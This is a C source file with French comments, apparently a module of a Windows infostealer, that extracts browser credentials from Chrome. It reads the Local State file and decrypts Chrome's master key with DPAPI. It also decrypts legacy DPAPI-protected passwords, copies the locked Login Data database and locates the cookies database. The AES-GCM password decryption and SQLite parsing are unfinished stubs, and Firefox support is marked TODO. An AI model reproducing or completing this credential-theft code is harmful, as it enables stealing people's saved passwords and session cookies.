/*
 * browser.c - Extraction des credentials navigateurs
 *
 * Chrome: SQLite + DPAPI/AES-GCM decryption
 * Firefox: profiles.ini + logins.json (TODO)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")

/* Helpers */

/* Décode base64 */
static BYTE* Base64Decode(const char* input, DWORD* outLen) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {
        return NULL;
    }
    BYTE* output = (BYTE*)malloc(len);
    if (!output) return NULL;
    
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output, &len, NULL, NULL)) {
        free(output);
        return NULL;
    }
    *outLen = len;
    return output;
}

/* Déchiffre avec DPAPI */
static BYTE* DPAPIDecrypt(BYTE* data, DWORD dataLen, DWORD* outLen) {
    DATA_BLOB in, out;
    in.pbData = data;
    in.cbData = dataLen;
    
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        return NULL;
    }
    
    BYTE* result = (BYTE*)malloc(out.cbData);
    if (result) {
        memcpy(result, out.pbData, out.cbData);
        *outLen = out.cbData;
    }
    LocalFree(out.pbData);
    return result;
}

/* Minimal JSON parser (no external lib) */

/* Trouve une valeur string dans un JSON simple */
static char* JsonGetString(const char* json, const char* key) {
    char searchKey[256];
    snprintf(searchKey, sizeof(searchKey), "\"%s\"", key);
    
    const char* found = strstr(json, searchKey);
    if (!found) return NULL;
    
    // Cherche le : puis la valeur
    found = strchr(found, ':');
    if (!found) return NULL;
    found++;
    
    // Skip espaces
    while (*found == ' ' || *found == '\t' || *found == '\n') found++;
    
    if (*found != '"') return NULL;
    found++;
    
    // Trouve la fin de la string
    const char* end = found;
    while (*end && *end != '"') {
        if (*end == '\\') end++; // Skip escaped chars
        if (*end) end++;
    }
    
    size_t len = end - found;
    char* result = (char*)malloc(len + 1);
    if (result) {
        memcpy(result, found, len);
        result[len] = '\0';
    }
    return result;
}

/* Chrome password extraction */

/* Lit le fichier Local State et extrait la clé maître */
static BYTE* GetChromeMasterKey(DWORD* keyLen) {
    char localStatePath[MAX_PATH];
    char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return NULL;
    
    snprintf(localStatePath, sizeof(localStatePath), 
             "%s\\Google\\Chrome\\User Data\\Local State", localAppData);
    
    // Lit le fichier
    FILE* f = fopen(localStatePath, "rb");
    if (!f) return NULL;
    
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    char* content = (char*)malloc(fileSize + 1);
    if (!content) { fclose(f); return NULL; }
    
    fread(content, 1, fileSize, f);
    content[fileSize] = '\0';
    fclose(f);
    
    // Trouve encrypted_key
    char* encKeyB64 = JsonGetString(content, "encrypted_key");
    free(content);
    if (!encKeyB64) return NULL;
    
    // Décode base64
    DWORD encKeyLen = 0;
    BYTE* encKey = Base64Decode(encKeyB64, &encKeyLen);
    free(encKeyB64);
    if (!encKey) return NULL;
    
    // Skip le préfixe "DPAPI" (5 bytes)
    if (encKeyLen <= 5 || memcmp(encKey, "DPAPI", 5) != 0) {
        free(encKey);
        return NULL;
    }
    
    // Déchiffre avec DPAPI
    BYTE* masterKey = DPAPIDecrypt(encKey + 5, encKeyLen - 5, keyLen);
    free(encKey);
    
    return masterKey;
}

/* Déchiffre un password Chrome (AES-256-GCM après v80) */
static char* DecryptChromePassword(BYTE* encData, DWORD encLen, BYTE* masterKey, DWORD masterKeyLen) {
    // Format: "v10" ou "v11" (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
    if (encLen < 3 + 12 + 16) return NULL;
    
    // Check version prefix
    if (encData[0] != 'v' || (encData[1] != '1' || (encData[2] != '0' && encData[2] != '1'))) {
        // Ancien format DPAPI directement
        DWORD decLen = 0;
        BYTE* dec = DPAPIDecrypt(encData, encLen, &decLen);
        if (dec) {
            char* result = (char*)malloc(decLen + 1);
            if (result) {
                memcpy(result, dec, decLen);
                result[decLen] = '\0';
            }
            free(dec);
            return result;
        }
        return NULL;
    }
    
    // AES-256-GCM decryption nécessite BCrypt (Windows Vista+)
    // Pour simplifier, on utilise l'API BCrypt
    
    BYTE* nonce = encData + 3;
    BYTE* ciphertext = encData + 3 + 12;
    DWORD cipherLen = encLen - 3 - 12 - 16;
    BYTE* tag = encData + encLen - 16;
    
    // TODO: BCrypt AES-GCM decryption
    // Pour l'instant, on retourne un placeholder
    // L'implémentation complète nécessite bcrypt.lib
    
    (void)nonce;
    (void)ciphertext;
    (void)cipherLen;
    (void)tag;
    (void)masterKey;
    (void)masterKeyLen;
    
    return strdup("[AES-GCM decryption - requires BCrypt implementation]");
}

/* 
 * Extrait les passwords Chrome.
 * Retourne un JSON avec les credentials.
 * L'appelant doit libérer le résultat.
 */
BOOL Browser_GetChromePasswords(char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;
    
    // Récupère la clé maître
    DWORD masterKeyLen = 0;
    BYTE* masterKey = GetChromeMasterKey(&masterKeyLen);
    
    // Chemin de la DB Login Data
    char dbPath[MAX_PATH];
    char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) {
        if (masterKey) free(masterKey);
        return FALSE;
    }
    
    snprintf(dbPath, sizeof(dbPath),
             "%s\\Google\\Chrome\\User Data\\Default\\Login Data", localAppData);
    
    // Copie la DB car Chrome la verrouille
    char tmpPath[MAX_PATH];
    snprintf(tmpPath, sizeof(tmpPath), "%s\\Temp\\login_data_copy.db", localAppData);
    
    if (!CopyFileA(dbPath, tmpPath, FALSE)) {
        if (masterKey) free(masterKey);
        return FALSE;
    }
    
    // Note: La lecture SQLite nécessiterait sqlite3.lib
    // Pour une implémentation légère, on peut parser le fichier binaire
    // ou utiliser une lib SQLite embarquée
    
    // Pour l'instant, on retourne les infos de base
    char* json = (char*)malloc(4096);
    if (!json) {
        if (masterKey) free(masterKey);
        DeleteFileA(tmpPath);
        return FALSE;
    }
    
    snprintf(json, 4096,
        "{\n"
        "  \"browser\": \"Chrome\",\n"
        "  \"db_path\": \"%s\",\n"
        "  \"master_key_found\": %s,\n"
        "  \"note\": \"SQLite parsing required for full extraction\"\n"
        "}",
        dbPath,
        masterKey ? "true" : "false");
    
    if (masterKey) free(masterKey);
    DeleteFileA(tmpPath);
    
    *outJson = json;
    return TRUE;
}

/*
 * Extrait les cookies Chrome.
 */
BOOL Browser_GetChromeCookies(char** outJson) {
    if (!outJson) return FALSE;
    
    char dbPath[MAX_PATH];
    char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return FALSE;
    
    snprintf(dbPath, sizeof(dbPath),
             "%s\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", localAppData);
    
    // Vérifie si le fichier existe
    DWORD attrs = GetFileAttributesA(dbPath);
    BOOL exists = (attrs != INVALID_FILE_ATTRIBUTES);
    
    char* json = (char*)malloc(1024);
    if (!json) return FALSE;
    
    snprintf(json, 1024,
        "{\n"
        "  \"browser\": \"Chrome\",\n"
        "  \"cookies_db\": \"%s\",\n"
        "  \"exists\": %s,\n"
        "  \"note\": \"SQLite parsing required for cookie extraction\"\n"
        "}",
        dbPath,
        exists ? "true" : "false");
    
    *outJson = json;
    return TRUE;
}
